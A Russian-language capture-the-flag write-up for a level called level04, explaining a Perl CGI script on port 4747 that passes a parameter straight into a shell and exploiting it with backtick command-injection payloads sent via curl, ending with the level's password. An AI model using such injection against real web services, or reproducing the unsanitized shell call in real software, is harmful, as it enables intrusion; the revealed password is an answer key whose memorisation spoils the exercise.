level04:
Здесь есть файл
Файл PL - это сценарий, написанный на высокоуровневом языке программирования Perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
Он настроит общий интерфейс шлюза, через который сервер Apache будет запускать программу и возвращать ее выходные данные.
В файле описывается используемое окружение
Далее хост, на котором он расположен
Далее подключается библиотека.
Печатается содержимое текст.
Переменные начинаются с $
Со слов sub начинается функция x
Переменной присвается переданное значение из параметров.
Т.е. когда передаем параметры, то они хранятся обычно в $_[0] и $_[1].
А дальше есть подсказка использовать CGI.
А CGI предполгает передачу параметров через скрипт.
По факту это описанная веб-страница на порту 4747, которая получает аргумент и обрабатывает её, выводя тем самым токен.
Через команду netstat -lt мы можем увидеть какие порты открыты.
Видим, что 4747 открыт, соот-но отправляем через команду curl, которая 
передаёт ссылки - аргументы.
curl localhost:4747?x=\'getflag\'

Т.е. в perl коде подсказка для нас о том, что 4747 порт слушает и принимает аргументы. Чтобы понять это, можно отправлять разные аргументы и он их выведет. А вот если отправить getflag, то он выдаст нам токен

Теперь запустим и передадим аргумент
./level04 x="hello"
Мы видим как он запускается с ошибками, но при этом выводит текст.
А если передать через апостроф, то будет воспринимать как команду
./level04.pl x=`whoami`
Выдаст имя учётки.

А теперь чтобы получить результат, нужно передать по этому порту выше 4747

curl - передаёт запросы по шлюзу
curl 'localhost:4747/level04.pl?x=`getflag`'

password: ne2searoevaevoem4ov4ar8ap
